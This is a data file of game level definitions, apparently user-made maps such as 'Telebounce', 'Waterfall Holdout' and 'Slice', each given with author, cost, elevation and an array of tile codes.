maps.push({name="Telebounce",author="Luffaren",id="#1660316792",direction="forward",cost=282,elevation=-5,map=[1,1,1,1,1,1,1,1,24,2,2,24,1,1,1,1,1,1,1,1,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,24,19,19,3,0,67,67,67,67,0,24,24,0,67,67,67,67,0,3,19,19,19,19,19,0,0,0,0,0,0,24,24,0,0,0,0,0,0,19,19,19,19,131,19,0,0,0,0,0,0,96,96,0,0,0,0,0,0,19,131,19,19,19,19,0,0,0,0,0,0,96,96,0,0,0,0,0,0,19,19,19,19,19,19,0,0,0,0,0,0,96,96,0,0,0,0,0,0,19,19,19,19,131,19,0,0,0,0,0,0,24,24,0,0,0,0,0,0,19,131,19,19,19,19,0,0,0,0,0,0,100,100,0,0,0,0,0,0,19,19,19,19,19,19,0,0,0,0,0,0,93,93,0,0,0,0,0,0,19,19,19,19,131,19,0,0,0,0,0,0,24,24,0,0,0,0,0,0,19,131,19,19,19,19,0,0,0,0,0,0,19,19,0,0,0,0,0,0,19,19,19,19,19,19,0,0,0,0,0,0,97,97,0,0,0,0,0,0,19,19,19,19,131,19,0,0,0,0,0,0,19,19,0,0,0,0,0,0,19,131,19,19,19,19,0,0,0,0,0,0,94,94,0,0,0,0,0,0,19,19,19,19,19,19,0,0,0,0,0,0,19,19,0,0,0,0,0,0,19,19,19,19,131,19,0,0,0,0,0,0,19,19,0,0,0,0,0,0,19,131,19,19,19,19,24,24,24,24,24,24,19,19,24,24,24,24,24,24,19,19,19,24,24,24,24,24,24,24,24,24,2,2,24,24,24,24,24,24,24,24,24]});
maps.push({name="Ramparts",author="Luffaren",id="#1660316816",direction="left",cost=315,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,5,5,2,2,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,94,5,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,0,0,0,17,17,17,16,15,14,13,12,11,10,9,8,7,6,5,94,5,0,0,0,17,17,17,16,15,14,13,12,11,10,9,8,7,6,5,5,5,0,0,0,17,17,17,16,15,14,13,12,11,10,9,8,7,6,5,5,5,0,1,1,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,0,1,1,90,17,17,17,17,17,17,90,17,17,17,17,90,17,17,89,17,0,0,0,17,17,17,18,19,20,21,22,23,24,24,24,24,24,17,17,17,0,0,0,17,89,17,18,19,20,21,22,23,24,24,24,24,24,90,17,17,0,0,0,17,17,17,18,19,20,21,22,23,24,24,24,24,24,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,89,24,17,17,65,67,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,65,65,65,67,0,0,0,0,0,0,0,0,0,0,0,0,0,90,24,24,65,17,17,0,0,0,24,24,24,24,24,24,24,24,24,24,24,24,24,24,17,17,17,0,5,5,24,100,24,93,24,93,24,93,24,24,24,24,89,24,17,94,17,0,2,5,24,24,24,24,24,24,24,24,24,24,24,24,24,24,17,17,17,0,2,5,5,6,7,8,9,10,11,12,13,14,15,16,17,17,17,17,90,0,5,5,5,6,7,8,9,10,11,12,13,14,15,16,17,17,17,17,17,0,5,5,5,6,7,8,9,10,11,12,13,14,15,16,17,17,17,17,17,0]});
maps.push({name="Side project",author="Luffaren",id="#1660316840",direction="forward",cost=124,elevation=0,map=[0,0,0,0,0,0,0,0,14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,0,0,0,0,0,0,36,36,0,35,35,0,14,94,14,14,14,14,94,14,0,35,35,0,36,36,127,36,0,35,35,0,14,14,14,100,100,14,14,14,0,35,35,0,36,127,0,0,0,0,0,0,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,36,36,1,0,0,0,0,17,17,14,14,17,17,0,0,0,0,1,36,36,36,129,0,0,0,0,0,93,17,14,14,17,93,0,0,0,0,0,128,36,36,36,1,0,0,0,0,17,17,14,14,17,17,0,0,0,0,1,36,36,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0]});
maps.push({name="Surfs up dude",author="Luffaren",id="#1660316864",direction="right",cost=364,elevation=-15,map=[24,2,2,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,127,127,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,135,135,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,135,135,135,135,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,135,135,135,135,1,0,0,0,1,93,0,0,0,0,0,0,0,0,0,0,135,135,135,135,1,0,0,0,1,9,0,0,0,0,0,0,0,0,0,0,135,135,135,135,1,0,0,0,1,94,9,9,9,9,89,9,9,9,0,0,135,135,135,135,1,1,1,1,1,1,1,1,1,1,1,1,1,9,1,1,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,9,9,9,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,9,9,9,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,9,9,2,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,9,9,2,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,135,9,9,9,135,9,129,135,135,135,135,135,135,135,135,135,135,135,135,135,135,9,89,9,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Hallways of peril",author="Luffaren",id="#1660316891",direction="left",cost=339,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,1,1,1,1,1,1,1,1,1,1,0,0,0,0,1,114,114,1,0,0,1,114,114,114,114,114,114,114,114,1,0,0,0,0,1,114,90,1,0,0,1,114,89,114,114,114,114,89,114,1,0,0,0,0,1,114,114,1,0,0,1,114,114,1,1,1,1,114,114,1,1,1,1,1,1,114,114,1,0,0,1,114,90,1,0,0,1,114,114,114,114,114,114,114,114,89,114,1,0,0,1,114,114,1,0,0,1,114,114,90,114,114,114,114,114,114,114,1,0,0,1,114,114,1,1,1,1,114,114,1,1,1,1,1,1,114,114,1,0,0,1,90,14,14,90,1,1,114,114,1,0,0,0,0,1,114,90,1,0,0,1,14,14,14,14,1,1,114,114,1,1,1,1,1,1,114,114,1,1,1,2,14,14,14,14,114,114,114,89,114,114,90,114,114,114,89,114,114,114,1,2,14,14,14,14,114,114,114,114,114,114,114,114,114,114,114,114,114,114,1,1,14,14,14,14,1,1,1,1,1,1,114,114,1,1,1,1,114,114,1,1,90,14,14,90,1,0,0,0,0,1,114,114,1,0,0,1,114,114,1,1,1,114,114,1,1,0,0,0,0,1,114,90,1,1,1,1,114,89,1,0,1,114,114,1,0,0,0,0,0,1,114,114,1,114,114,114,114,114,1,0,1,114,114,1,1,1,1,1,1,1,114,114,1,114,93,114,94,114,1,0,1,114,89,114,114,114,90,114,114,114,89,114,1,114,93,114,94,114,1,0,1,114,114,114,114,114,114,114,114,114,114,114,1,114,114,114,114,114,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="Step by step",author="Luffaren",id="#1660316911",direction="forward",cost=130,elevation=-19,map=[0,0,0,0,0,0,0,24,2,2,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,0,0,0,0,0,0,0,0,0,0,39,39,0,0,0,0,19,19,19,19,0,0,0,0,0,0,0,0,0,0,93,39,39,39,39,39,19,89,19,19,0,0,0,0,0,0,0,0,0,0,94,39,39,39,39,39,19,19,89,19,0,0,0,0,0,0,0,0,0,0,39,39,0,0,0,0,19,19,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,34,34,0,0,0,0,0,0,0,0,0,14,14,89,14,34,34,34,34,34,34,94,0,0,0,0,0,0,0,0,0,14,89,14,14,34,34,34,34,34,34,93,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,34,34,0,0,0,29,29,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,93,29,29,29,29,29,9,89,9,9,0,0,0,0,0,0,0,0,0,0,94,29,29,29,29,29,9,9,89,9,0,0,0,0,0,0,0,0,0,0,29,29,0,0,0,0,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0]});
maps.push({name="666",author="Luffaren",id="#1660317005",direction="forward",cost=158,elevation=0,map=[0,0,0,0,0,0,9,5,5,2,2,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,5,5,0,0,5,0,0,0,0,0,0,0,5,5,0,0,0,0,0,5,5,0,0,0,5,5,0,0,0,0,0,0,0,5,5,0,0,0,5,5,0,0,0,0,5,0,5,0,0,0,0,0,0,0,5,9,0,0,5,0,0,0,0,0,5,0,5,5,0,0,0,9,9,5,5,5,0,5,5,0,0,0,0,0,5,0,0,5,5,9,9,0,0,5,0,5,9,5,0,0,0,0,0,0,5,5,5,5,5,0,0,0,5,0,0,5,5,5,0,0,0,5,5,5,5,0,0,0,5,5,0,5,0,0,0,0,5,5,9,5,5,19,0,0,5,0,0,0,0,5,5,19,0,0,0,0,5,5,19,5,9,0,0,0,5,0,0,0,0,19,5,0,0,0,0,0,5,5,0,0,5,5,5,5,5,0,0,0,0,5,5,19,0,0,0,0,5,5,19,0,0,0,0,5,5,5,5,0,5,5,0,5,0,0,0,0,5,5,5,0,0,0,0,0,5,0,0,5,5,0,0,0,5,0,0,5,5,0,5,0,0,0,0,0,5,0,0,5,0,5,5,0,5,0,0,5,0,0,5,5,0,0,0,0,5,0,5,0,0,0,0,19,5,5,5,5,0,0,0,5,5,0,0,0,5,5,0,0,0,0,0,0,0,5,9,0,0,0,0,0,5,5,0,0,5,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,9,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,2,2,5,5,5,0,0,0,0,0,0]});
maps.push({name="waterfall",author="MoistNoodlez",id="#1660398738",direction="forward",cost=104,elevation=-9,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,127,127,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,67,0,0,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,67,44,67,67,44,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,67,44,67,67,44,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,67,44,67,67,44,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,67,0,0,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,66,66,66,66,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,66,66,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,66,66,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0]});
maps.push({name="Falls 4 You",author="MoistNoodlez",id="#1660400166",direction="forward",cost=132,elevation=-4,map=[0,0,0,0,0,0,0,9,2,2,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,92,0,92,92,0,92,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,77,44,67,67,44,77,0,0,0,0,0,0,0,0,0,0,0,0,0,0,77,44,67,67,44,77,0,0,0,0,0,0,0,0,0,0,0,0,0,0,77,44,67,67,44,77,0,0,0,0,0,0,0,0,0,0,0,0,0,0,77,44,67,67,44,77,0,0,0,0,0,0,0,0,0,0,0,0,0,0,77,44,67,67,44,77,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,95,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,95,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Water Jump",author="MoistNoodlez",id="#1660400277",direction="forward",cost=403,elevation=0,map=[1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,1,58,58,58,58,58,58,58,58,58,58,58,58,58,1,0,0,0,0,0,1,58,58,58,58,58,58,58,58,58,58,58,58,58,1,0,0,0,0,0,1,58,58,58,58,58,58,58,58,58,58,58,58,58,1,0,0,0,0,0,1,94,93,58,58,58,58,58,58,58,44,44,58,58,1,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,44,58,58,1,0,0,0,0,0,58,92,108,108,108,108,108,66,67,44,67,44,58,58,1,0,0,0,0,0,58,92,108,108,108,108,108,66,67,44,67,44,58,58,1,0,0,0,0,0,58,92,108,108,108,108,108,66,67,44,67,44,58,58,1,0,0,0,0,0,58,92,108,108,108,108,108,66,67,44,67,44,58,58,1,0,0,0,0,0,58,92,108,108,108,108,108,66,67,44,67,44,58,58,1,0,0,0,0,0,58,92,108,108,108,108,108,66,67,44,67,44,58,58,1,0,0,0,0,0,58,92,108,108,108,108,108,66,67,44,67,44,58,58,1,0,0,0,0,0,58,1,1,44,44,44,44,44,44,44,67,44,58,58,1,0,0,0,0,0,58,1,67,67,67,67,67,67,67,67,67,44,96,96,1,0,0,0,0,0,58,1,67,67,67,67,67,67,67,67,67,44,96,96,1,0,0,0,0,0,58,1,1,44,44,44,44,44,44,44,44,44,58,58,1,0,0,0,0,0,58,57,56,55,55,55,56,57,58,58,58,58,58,58,1,0,0,0,0,0,58,57,56,55,55,55,56,57,58,58,58,58,58,58,1,0,0,0,0,0,58,57,56,55,55,55,56,57,58,97,58,58,2,2,1,0,0,0,0,0]});
maps.push({name="Straight Water",author="MoistNoodlez",id="#1660400454",direction="forward",cost=60,elevation=-5,map=[0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,43,43,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,42,42,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,41,41,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,38,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,37,37,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,36,36,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,127,35,35,127,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,127,34,34,127,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,125,125,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,66,66,66,66,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,39,39,39,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,2,2,39,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Waterfall Holdout",author="MoistNoodlez",id="#1660400579",direction="forward",cost=146,elevation=-19,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,66,66,66,66,66,66,0,0,0,0,0,0,0,0,0,0,0,0,0,0,67,67,67,67,67,67,0,0,0,0,0,0,0,0,0,0,0,0,0,0,66,66,66,66,66,66,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,88,5,88,88,5,88,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,88,5,5,88,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,88,5,5,88,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,88,88,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,88,88,5,5,88,88,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,95,95,95,95,95,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0]});
maps.push({name="lava stream",author="MoistNoodlez",id="#1660400852",direction="forward",cost=208,elevation=-12,map=[1,24,2,2,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,24,75,75,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,23,75,75,75,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,75,75,75,22,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,22,75,75,75,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,75,75,75,22,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,21,75,75,21,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,20,75,75,20,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,19,75,75,19,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,18,75,75,18,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,17,75,75,75,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,75,75,75,17,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,16,75,75,16,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,15,75,75,15,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,75,75,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,75,75,75,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,75,75,75,13,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,13,75,75,13,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,12,75,75,12,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,12,2,2,12,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Water U Turn",author="MoistNoodlez",id="#1660401822",direction="forward",cost=301,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,127,127,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,66,66,1,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,66,66,66,1,0,0,0,0,0,0,0,0,1,66,66,66,66,73,73,73,66,66,66,1,0,0,0,0,0,0,0,0,1,66,66,66,66,73,73,73,73,66,66,1,0,0,0,0,0,0,0,0,1,66,66,66,66,73,73,73,73,66,66,1,0,0,0,0,0,0,0,0,1,66,66,66,66,73,73,73,73,66,66,1,0,0,0,0,0,0,0,0,1,72,72,72,72,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,66,66,66,66,74,74,74,74,72,72,1,0,0,0,0,0,0,0,0,1,66,66,66,66,74,74,74,74,72,72,1,0,0,0,0,0,0,0,0,1,66,66,66,66,74,74,74,74,66,66,1,0,0,0,0,0,0,0,0,1,66,66,66,66,74,74,74,66,66,66,1,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,66,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,95,95,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1]});
maps.push({name="ezrace",author="MoistNoodlez",id="#1660401932",direction="forward",cost=152,elevation=-5,map=[0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,127,127,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,76,66,66,76,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,76,66,66,76,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,76,66,66,76,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,76,66,66,76,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,76,66,66,76,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,76,66,66,76,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,76,91,91,76,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,76,66,66,76,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,76,66,66,76,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,76,91,91,76,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,76,66,66,76,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,76,66,66,76,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,76,66,66,76,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,76,14,14,76,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,2,2,14,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Mix and Slide",author="MoistNoodlez",id="#1660402529",direction="forward",cost=382,elevation=0,map=[0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,127,127,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,127,127,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,130,130,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,130,130,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,130,130,130,135,135,135,1,1,1,1,1,1,0,0,0,0,0,0,0,1,130,130,130,135,135,135,135,135,135,135,135,93,1,0,0,0,0,0,0,1,130,135,135,135,135,135,135,135,135,135,135,135,1,0,0,0,0,0,0,1,135,135,135,135,135,135,135,135,135,135,135,135,1,0,0,0,0,0,0,1,93,135,135,135,135,135,135,135,135,135,135,135,1,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,135,135,135,1,0,0,0,1,94,66,66,66,66,66,66,66,66,66,135,135,135,135,135,1,0,0,0,1,66,66,66,66,66,66,66,66,66,135,135,135,135,135,135,1,0,0,0,1,66,66,66,66,66,66,66,66,135,135,135,135,135,135,135,1,0,0,0,1,66,66,66,66,66,66,66,66,135,135,135,135,135,135,94,1,0,0,0,1,66,66,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,1,66,66,66,66,66,66,66,66,1,0,0,0,0,0,0,0,0,0,0,1,66,66,66,66,66,66,66,66,1,0,0,0,0,0,0,0,0,0,0,1,66,66,66,66,66,66,14,14,1,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,2,2,1,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Slice",author="tilgep",id="#1660406505",direction="forward",cost=449,elevation=-15,map=[0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,2,124,112,112,137,112,112,116,116,134,116,116,120,120,132,120,120,124,124,124,124,124,112,112,112,112,112,116,116,116,116,116,120,120,120,120,120,124,124,124,124,124,112,112,112,112,112,116,116,116,116,116,120,120,120,120,120,124,124,124,124,124,112,112,112,112,112,116,116,116,116,116,120,120,120,120,120,124,124,124,124,124,111,111,111,111,111,115,115,115,115,115,119,119,119,119,119,123,123,123,123,123,111,111,111,111,111,115,115,115,115,115,119,119,119,119,119,123,123,123,123,123,111,111,111,111,111,115,115,115,115,115,119,119,119,119,119,123,123,123,123,123,111,111,111,111,111,115,115,115,115,115,119,119,119,119,119,123,123,123,123,123,111,111,111,111,111,115,115,115,115,115,119,119,119,119,119,123,123,123,123,123,110,110,110,110,110,114,114,114,114,114,118,118,118,118,118,122,122,122,122,122,110,110,110,110,110,114,114,114,114,114,118,118,118,118,1,95,95,95,95,95,110,110,110,110,110,114,114,114,114,1,95,95,95,95,1,122,122,122,122,95,110,110,110,110,110,95,95,95,95,1,118,118,118,118,1,122,122,122,122,95,110,110,110,110,110,114,114,114,114,1,118,118,118,118,118,122,122,122,122,122,109,109,109,109,109,113,113,113,113,113,117,117,117,117,117,121,121,121,121,121,95,95,95,95,1,113,113,113,113,113,117,117,117,117,117,121,121,121,121,121,95,109,109,109,1,113,113,113,113,113,117,117,117,117,117,121,121,121,121,121,95,109,109,109,1,113,113,113,113,113,117,117,117,117,117,121,121,121,121,121,109,2,2,1,1,1,1,136,1,1,1,1,133,1,1,1,1,131,121,121]});
